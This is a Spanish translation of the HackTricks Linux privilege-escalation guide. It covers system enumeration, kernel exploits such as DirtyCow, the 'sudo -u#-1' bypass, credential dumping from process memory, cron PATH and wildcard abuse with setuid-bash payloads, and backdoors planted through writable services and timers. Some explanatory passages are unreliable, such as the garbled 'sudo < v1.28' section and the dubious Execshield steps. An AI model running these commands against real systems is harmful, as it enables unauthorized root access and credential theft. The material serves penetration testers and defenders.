# Escalada de Privilegios en Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información del Sistema

### Información del SO

Comencemos obteniendo conocimiento del sistema operativo en ejecución.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ruta

Si **tienes permisos de escritura en cualquier carpeta dentro de la variable `PATH`**, es posible que puedas secuestrar algunas bibliotecas o binarios:
```bash
echo $PATH
```
### Información del entorno

¿Información interesante, contraseñas o claves de API en las variables de entorno?
```bash
(env || set) 2>/dev/null
```
### Exploits del Kernel

Verifica la versión del kernel y si existe algún exploit que se pueda utilizar para escalar privilegios.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puedes encontrar una buena lista de kernels vulnerables y algunos **exploits ya compilados** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Otros sitios donde puedes encontrar algunos **exploits ya compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones de kernel vulnerables de esa web, puedes hacer lo siguiente:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Las herramientas que podrían ayudar a buscar exploits del kernel son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar en la víctima, solo verifica exploits para el kernel 2.x)

Siempre **busque la versión del kernel en Google**, tal vez su versión del kernel esté escrita en algún exploit del kernel y así estará seguro de que este exploit es válido.

### CVE-2016-5195 (DirtyCow)

Elevación de privilegios en Linux - Kernel de Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versión de Sudo

Basado en las versiones vulnerables de sudo que aparecen en:
```bash
searchsploit sudo
```
Puedes verificar si la versión de sudo es vulnerable utilizando este comando grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

De @sickrov

---

El comando `sudo` es una herramienta comúnmente utilizada en sistemas Linux para permitir a los usuarios ejecutar comandos con privilegios de superusuario. Sin embargo, en versiones anteriores a la 1.28 de `sudo`, existe una vulnerabilidad que puede ser explotada para obtener privilegios de root de forma no autorizada.

Esta vulnerabilidad se debe a un error en la forma en que `sudo` maneja las entradas de línea de comandos. Un atacante puede aprovechar esta vulnerabilidad para ejecutar comandos arbitrarios con privilegios de root, incluso si no tiene los permisos necesarios.

Para explotar esta vulnerabilidad, el atacante debe tener acceso a una cuenta de usuario con el permiso de ejecutar `sudo`. A continuación, puede utilizar una técnica conocida como "inyección de argumentos" para manipular las opciones de línea de comandos y ejecutar comandos maliciosos.

La mejor manera de protegerse contra esta vulnerabilidad es actualizar `sudo` a una versión posterior a la 1.28. Esto se puede hacer mediante la instalación de las actualizaciones de seguridad más recientes para su distribución de Linux.

Si no es posible actualizar `sudo` a una versión más reciente, se recomienda restringir el acceso a `sudo` solo a los usuarios que realmente lo necesiten. Esto puede hacerse mediante la configuración adecuada de los archivos de configuración de `sudo` y la asignación de permisos de manera restrictiva.

Es importante tener en cuenta que esta vulnerabilidad solo afecta a las versiones anteriores a la 1.28 de `sudo`. Si está utilizando una versión más reciente, no es necesario tomar ninguna medida adicional para protegerse contra esta vulnerabilidad.
```
sudo -u#-1 /bin/bash
```
### Error de verificación de firma de Dmesg

Verifica la **máquina smasher2 de HTB** para un **ejemplo** de cómo esta vulnerabilidad podría ser explotada.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Más enumeración del sistema

Once you have gained initial access to a system, it is important to gather as much information as possible about the target system. This will help you identify potential vulnerabilities and escalate your privileges.

A continuación se presentan algunas técnicas de enumeración adicionales que pueden ser útiles:

#### Enumeración de usuarios y grupos

- **/etc/passwd**: Este archivo contiene información sobre los usuarios del sistema, como sus nombres de usuario, identificadores de usuario (UID) y directorios de inicio.
- **/etc/group**: Este archivo contiene información sobre los grupos del sistema, como sus nombres y los identificadores de grupo (GID) asociados.

#### Enumeración de servicios y puertos

- **netstat**: Esta herramienta muestra las conexiones de red activas, los puertos abiertos y los servicios que se están ejecutando en el sistema.
- **lsof**: Esta herramienta muestra los archivos abiertos por los procesos en ejecución, lo que puede ayudar a identificar servicios y puertos en uso.

#### Enumeración de archivos y directorios

- **find**: Esta herramienta permite buscar archivos y directorios en el sistema en función de diferentes criterios, como el nombre, el tamaño y los permisos.
- **ls**: Esta herramienta muestra el contenido de un directorio, incluidos los archivos y subdirectorios.

#### Enumeración de procesos

- **ps**: Esta herramienta muestra los procesos en ejecución en el sistema, incluidos sus identificadores de proceso (PID) y otros detalles relevantes.

Recuerda que la enumeración del sistema es un paso crucial en el proceso de hacking ético, ya que te proporciona información valiosa para identificar posibles puntos débiles y aumentar tus privilegios en el sistema objetivo.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
AppArmor es un sistema de seguridad que limita los recursos y acciones a los que puede acceder un programa en Linux. Se utiliza para restringir los privilegios de las aplicaciones y evitar que se ejecuten acciones no autorizadas. AppArmor se configura mediante perfiles que definen las reglas de acceso para cada programa. Estos perfiles se pueden personalizar para adaptarse a las necesidades de seguridad específicas de un sistema.
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity es un conjunto de parches de seguridad para el kernel de Linux que proporciona una protección adicional contra ataques de escalada de privilegios. Estos parches implementan medidas de seguridad avanzadas, como la protección de memoria, la restricción de capacidades y la auditoría de seguridad.

La protección de memoria de Grsecurity ayuda a prevenir ataques de desbordamiento de búfer y ejecución de código arbitrario al aplicar políticas de acceso estrictas a la memoria del sistema. Esto evita que los atacantes puedan modificar o corromper áreas de memoria críticas.

La restricción de capacidades limita los privilegios de los procesos, lo que significa que incluso si un atacante logra comprometer un proceso, no podrá realizar acciones maliciosas que estén fuera de su nivel de privilegio.

La auditoría de seguridad registra eventos y actividades sospechosas en el sistema, lo que permite a los administradores detectar y responder rápidamente a posibles ataques.

Grsecurity es una herramienta poderosa para fortalecer la seguridad de un sistema Linux y protegerlo contra ataques de escalada de privilegios. Sin embargo, es importante tener en cuenta que la instalación y configuración de Grsecurity requiere un conocimiento avanzado del sistema operativo y puede tener impacto en la compatibilidad con ciertos programas y funcionalidades.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
PaX es una característica de seguridad que se utiliza para proteger el sistema operativo Linux contra ataques de escalada de privilegios. PaX implementa diferentes técnicas, como la aleatorización de direcciones de memoria (ASLR), la protección de ejecución (NX) y la protección de escritura (W^X), para dificultar la explotación de vulnerabilidades en el kernel de Linux. Estas técnicas ayudan a prevenir la ejecución de código malicioso y a limitar los privilegios de los procesos, lo que hace que sea más difícil para un atacante obtener acceso no autorizado al sistema. PaX es una herramienta útil para fortalecer la seguridad de un sistema Linux y reducir el riesgo de escalada de privilegios.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield es una característica de seguridad implementada en el kernel de Linux que ayuda a proteger contra ataques de desbordamiento de búfer y ejecución de código malicioso. Esta característica utiliza técnicas como la aleatorización de direcciones de pila y la protección de la memoria para dificultar la explotación de vulnerabilidades en el sistema.

La aleatorización de direcciones de pila impide que un atacante pueda predecir la ubicación exacta de la pila en la memoria, lo que dificulta la ejecución de un ataque de desbordamiento de búfer. La protección de la memoria, por otro lado, ayuda a prevenir la ejecución de código malicioso en áreas de memoria no autorizadas.

Para habilitar Execshield en un sistema Linux, se pueden seguir los siguientes pasos:

1. Verificar si el kernel del sistema tiene soporte para Execshield. Esto se puede hacer ejecutando el comando `cat /proc/cpuinfo | grep execshield`. Si no se muestra ninguna salida, significa que el kernel no tiene soporte para Execshield.

2. Si el kernel tiene soporte para Execshield, se puede habilitar agregando el parámetro `exec-shield` al archivo de configuración del gestor de arranque. Por ejemplo, en sistemas que utilizan GRUB como gestor de arranque, se puede editar el archivo `/etc/default/grub` y agregar `exec-shield=1` al valor de la variable `GRUB_CMDLINE_LINUX`. Luego, se debe ejecutar el comando `update-grub` para aplicar los cambios.

3. Reiniciar el sistema para que los cambios surtan efecto.

Es importante tener en cuenta que Execshield es solo una de las muchas medidas de seguridad que se pueden implementar en un sistema Linux. Es recomendable utilizar otras técnicas de endurecimiento y seguir buenas prácticas de seguridad para garantizar la protección adecuada del sistema.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux (Security-Enhanced Linux) es un mecanismo de seguridad implementado en el kernel de Linux que proporciona un control granular sobre los permisos de acceso de los procesos y archivos del sistema. SElinux utiliza políticas de seguridad para restringir las acciones que pueden realizar los procesos y limitar el acceso a los recursos del sistema.

En el contexto de la escalada de privilegios, SElinux puede ser utilizado para mitigar o prevenir ataques al restringir los permisos de los procesos y archivos involucrados en el ataque. Al configurar adecuadamente las políticas de SElinux, se puede limitar la capacidad de un atacante para elevar sus privilegios y acceder a recursos sensibles del sistema.

Es importante tener en cuenta que la configuración de SElinux puede ser compleja y requiere un conocimiento profundo del sistema operativo y de las políticas de seguridad. Sin embargo, su implementación puede proporcionar una capa adicional de protección contra ataques de escalada de privilegios.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR (Address Space Layout Randomization) es una técnica de seguridad utilizada en sistemas operativos para prevenir ataques de escalada de privilegios y explotación de vulnerabilidades. 

ASLR funciona aleatorizando la ubicación en la memoria de los componentes clave del sistema, como las bibliotecas compartidas, las pilas y los segmentos de código. Esto dificulta que los atacantes encuentren y aprovechen las direcciones de memoria específicas necesarias para llevar a cabo un ataque exitoso.

Cuando ASLR está habilitado, las direcciones de memoria se asignan de manera aleatoria cada vez que se inicia un programa o se carga una biblioteca compartida. Esto hace que sea mucho más difícil para los atacantes predecir la ubicación exacta de los componentes del sistema y, por lo tanto, dificulta la explotación de vulnerabilidades.

ASLR es una medida de seguridad efectiva que se utiliza ampliamente en sistemas operativos modernos para proteger contra ataques de escalada de privilegios y explotación de vulnerabilidades. Al implementar ASLR, los sistemas operativos pueden dificultar significativamente los intentos de los atacantes de aprovechar las vulnerabilidades del sistema.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Escalada de privilegios en Docker

Si te encuentras dentro de un contenedor de Docker, puedes intentar escapar de él:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Unidades de almacenamiento

Verifica **qué está montado y desmontado**, dónde y por qué. Si algo está desmontado, puedes intentar montarlo y verificar si contiene información privada.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binarios útiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
También, verifica si **hay algún compilador instalado**. Esto es útil si necesitas utilizar alguna vulnerabilidad del kernel, ya que se recomienda compilarla en la máquina donde la vas a utilizar (o en una similar).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerable Instalado

Verifique la **versión de los paquetes y servicios instalados**. Tal vez haya alguna versión antigua de Nagios (por ejemplo) que pueda ser explotada para escalar privilegios...\
Se recomienda verificar manualmente la versión del software instalado más sospechoso.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si tienes acceso SSH a la máquina, también puedes usar **openVAS** para verificar si hay software desactualizado y vulnerable instalado en la máquina.

{% hint style="info" %}
_Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil, por lo tanto, se recomienda utilizar aplicaciones como OpenVAS o similares que verificarán si alguna versión de software instalada es vulnerable a exploits conocidos._
{% endhint %}

## Procesos

Echa un vistazo a **los procesos** que se están ejecutando y verifica si algún proceso tiene **más privilegios de los que debería** (¿tal vez un tomcat ejecutado por root?).
```bash
ps aux
ps -ef
top -n 1
```
Siempre verifica si hay posibles depuradores de [**electron/cef/chromium**] en ejecución, podrías abusar de ellos para escalar privilegios. **Linpeas** los detecta verificando el parámetro `--inspect` en la línea de comandos del proceso.
También verifica tus privilegios sobre los binarios de los procesos, tal vez puedas sobrescribir a alguien.

### Monitoreo de procesos

Puedes utilizar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorear procesos. Esto puede ser muy útil para identificar procesos vulnerables que se ejecutan con frecuencia o cuando se cumplen ciertos requisitos.

### Memoria de procesos

Algunos servicios de un servidor guardan **credenciales en texto claro dentro de la memoria**.
Normalmente necesitarás **privilegios de root** para leer la memoria de procesos que pertenecen a otros usuarios, por lo que esto suele ser más útil cuando ya eres root y quieres descubrir más credenciales.
Sin embargo, recuerda que **como usuario regular puedes leer la memoria de los procesos que posees**.

{% hint style="warning" %}
Ten en cuenta que en la actualidad la mayoría de las máquinas **no permiten ptrace de forma predeterminada**, lo que significa que no puedes volcar otros procesos que pertenezcan a tu usuario sin privilegios.

El archivo _**/proc/sys/kernel/yama/ptrace\_scope**_ controla la accesibilidad de ptrace:

* **kernel.yama.ptrace\_scope = 0**: todos los procesos pueden ser depurados, siempre y cuando tengan el mismo uid. Esta es la forma clásica en que funcionaba ptrace.
* **kernel.yama.ptrace\_scope = 1**: solo se puede depurar un proceso padre.
* **kernel.yama.ptrace\_scope = 2**: solo el administrador puede usar ptrace, ya que se requiere la capacidad CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: no se pueden rastrear procesos con ptrace. Una vez establecido, se necesita reiniciar para habilitar ptrace nuevamente.
{% endhint %}

#### GDB

Si tienes acceso a la memoria de un servicio FTP (por ejemplo), podrías obtener el Heap y buscar dentro de él las credenciales.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script de GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso dado, **maps muestra cómo se asigna la memoria dentro del espacio de direcciones virtuales de ese proceso**; también muestra los **permisos de cada región mapeada**. El archivo pseudo **mem expone la propia memoria del proceso**. A partir del archivo **maps, sabemos qué regiones de memoria son legibles** y sus desplazamientos. Utilizamos esta información para **buscar en el archivo mem y volcar todas las regiones legibles** en un archivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` proporciona acceso a la memoria **física** del sistema, no a la memoria virtual. El espacio de direcciones virtuales del kernel se puede acceder utilizando /dev/kmem.\
Normalmente, `/dev/mem` solo es legible por el usuario **root** y el grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para Linux

ProcDump es una versión para Linux de la clásica herramienta ProcDump de la suite de herramientas Sysinternals para Windows. Puedes obtenerla en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Herramientas

Para volcar la memoria de un proceso, puedes utilizar:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso de tu propiedad
* Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales de la memoria del proceso

#### Ejemplo manual

Si encuentras que el proceso del autenticador está en ejecución:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puedes volcar el proceso (ver secciones anteriores para encontrar diferentes formas de volcar la memoria de un proceso) y buscar credenciales dentro de la memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **robará credenciales en texto claro de la memoria** y de algunos **archivos conocidos**. Requiere privilegios de root para funcionar correctamente.

| Característica                                     | Nombre del Proceso   |
| ------------------------------------------------- | -------------------- |
| Contraseña de GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)  | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                           | lightdm              |
| VSFTPd (Conexiones FTP activas)                    | vsftpd               |
| Apache2 (Sesiones activas de autenticación básica HTTP) | apache2              |
| OpenSSH (Sesiones SSH activas - Uso de Sudo)       | sshd:                |

#### Búsqueda de Regex/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tareas programadas/Cron jobs

Verifique si alguna tarea programada es vulnerable. Tal vez pueda aprovechar un script que se ejecuta como root (¿vulnerabilidad de comodín? ¿puede modificar archivos que root utiliza? ¿usar enlaces simbólicos? ¿crear archivos específicos en el directorio que root utiliza?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ruta de Cron

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar la RUTA: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observa cómo el usuario "user" tiene privilegios de escritura sobre /home/user_)

Si dentro de este crontab el usuario root intenta ejecutar algún comando o script sin establecer la ruta. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener una shell de root utilizando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando un script con un comodín (Inyección de comodín)

Si un script ejecutado por root tiene un "**\***" dentro de un comando, podrías aprovechar esto para hacer cosas inesperadas (como una escalada de privilegios). Ejemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si el comodín está precedido de una ruta como** _**/alguna/ruta/\***_ **, no es vulnerable (incluso** _**./\***_ **no lo es).**

Lee la siguiente página para obtener más trucos de explotación de comodines:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Sobrescribir scripts de cron y symlink

Si **puedes modificar un script de cron** ejecutado por root, puedes obtener una shell muy fácilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si el script ejecutado por root utiliza un **directorio al que tienes acceso completo**, tal vez sería útil eliminar esa carpeta y **crear un enlace simbólico a otra carpeta** que sirva un script controlado por ti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Tareas cron frecuentes

Puedes monitorear los procesos para buscar aquellos que se ejecutan cada 1, 2 o 5 minutos. Tal vez puedas aprovechar esto para escalar privilegios.

Por ejemplo, para **monitorear cada 0.1s durante 1 minuto**, **ordenar por comandos menos ejecutados** y eliminar los comandos que se han ejecutado más veces, puedes hacer lo siguiente:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (esto monitoreará y listarará cada proceso que se inicie).

### Trabajos cron invisibles

Es posible crear un trabajo cron **colocando un retorno de carro después de un comentario** (sin carácter de nueva línea), y el trabajo cron funcionará. Ejemplo (nota el carácter de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servicios

### Archivos _.service_ con permisos de escritura

Verifica si puedes escribir algún archivo `.service`, si puedes, **podrías modificarlo** para que **ejecute** tu **puerta trasera cuando** el servicio se **inicie**, **reinicie** o **detenga** (tal vez debas esperar hasta que la máquina se reinicie).\
Por ejemplo, crea tu puerta trasera dentro del archivo .service con **`ExecStart=/tmp/script.sh`**

### Binarios de servicio con permisos de escritura

Ten en cuenta que si tienes **permisos de escritura sobre los binarios que son ejecutados por los servicios**, puedes cambiarlos por puertas traseras para que cuando los servicios sean reejecutados, las puertas traseras también se ejecuten.

### systemd PATH - Rutas relativas

Puedes ver el PATH utilizado por **systemd** con:
```bash
systemctl show-environment
```
Si descubres que puedes **escribir** en cualquiera de las carpetas de la ruta, es posible que puedas **elevar privilegios**. Debes buscar **rutas relativas que se utilicen en los archivos de configuración del servicio**, como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Luego, crea un **ejecutable** con el **mismo nombre que la ruta relativa del binario** dentro de la carpeta PATH de systemd en la que puedas escribir, y cuando se solicite al servicio ejecutar la acción vulnerable (**Start**, **Stop**, **Reload**), se ejecutará tu **puerta trasera** (los usuarios sin privilegios generalmente no pueden iniciar/detener servicios, pero verifica si puedes usar `sudo -l`).

**Obtén más información sobre los servicios con `man systemd.service`.**

## **Temporizadores**

Los **temporizadores** son archivos de unidad de systemd cuyo nombre termina en `**.timer**` y controlan archivos o eventos `**.service**`. Los **temporizadores** se pueden utilizar como una alternativa a cron, ya que tienen soporte incorporado para eventos de tiempo de calendario y eventos de tiempo monótono, y se pueden ejecutar de forma asíncrona.

Puedes enumerar todos los temporizadores con:
```bash
systemctl list-timers --all
```
### Temporizadores modificables

Si puedes modificar un temporizador, puedes hacer que ejecute algunas unidades existentes de systemd (como un `.service` o un `.target`).
```bash
Unit=backdoor.service
```
En la documentación se puede leer qué es una Unidad:

> La unidad que se activará cuando este temporizador expire. El argumento es el nombre de una unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor se establece por defecto en un servicio que tiene el mismo nombre que la unidad del temporizador, excepto por el sufijo. (Ver arriba). Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del temporizador sean idénticos, excepto por el sufijo.

Por lo tanto, para abusar de este permiso necesitarías:

* Encontrar alguna unidad de systemd (como un `.service`) que esté **ejecutando un binario modificable**
* Encontrar alguna unidad de systemd que esté **ejecutando una ruta relativa** y tener **privilegios de escritura** sobre la **ruta de systemd** (para suplantar ese ejecutable)

**Obtén más información sobre los temporizadores con `man systemd.timer`.**

### **Activando el Temporizador**

Para activar un temporizador necesitas privilegios de root y ejecutar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Ten en cuenta que el **temporizador** se **activa** creando un enlace simbólico a él en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

En resumen, un Socket Unix (técnicamente, el nombre correcto es Unix Domain Socket, **UDS**) permite la **comunicación entre dos procesos diferentes** en la misma máquina o en máquinas diferentes en marcos de aplicación cliente-servidor. Para ser más precisos, es una forma de comunicación entre computadoras utilizando un archivo de descriptores Unix estándar. (De [aquí](https://www.linux.com/news/what-socket/)).

Los sockets se pueden configurar utilizando archivos `.socket`.

**Aprende más sobre los sockets con `man systemd.socket`.** Dentro de este archivo, se pueden configurar varios parámetros interesantes:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes pero se utiliza un resumen para **indicar dónde va a escuchar** el socket (la ruta del archivo de socket AF\_UNIX, el número de puerto IPv4/6 para escuchar, etc.)
* `Accept`: Toma un argumento booleano. Si es **verdadero**, se genera una **instancia de servicio para cada conexión entrante** y solo se pasa el socket de conexión a ella. Si es **falso**, todos los sockets de escucha en sí se **pasan a la unidad de servicio iniciada**, y solo se genera una unidad de servicio para todas las conexiones. Este valor se ignora para los sockets de datagramas y FIFOs donde una única unidad de servicio maneja incondicionalmente todo el tráfico entrante. **El valor predeterminado es falso**. Por razones de rendimiento, se recomienda escribir nuevos demonios solo de una manera adecuada para `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Toma una o más líneas de comando, que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha se **crean** y se enlazan, respectivamente. El primer token de la línea de comando debe ser un nombre de archivo absoluto, seguido de argumentos para el proceso.
* `ExecStopPre`, `ExecStopPost`: Comandos adicionales que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha se **cierran** y se eliminan, respectivamente.
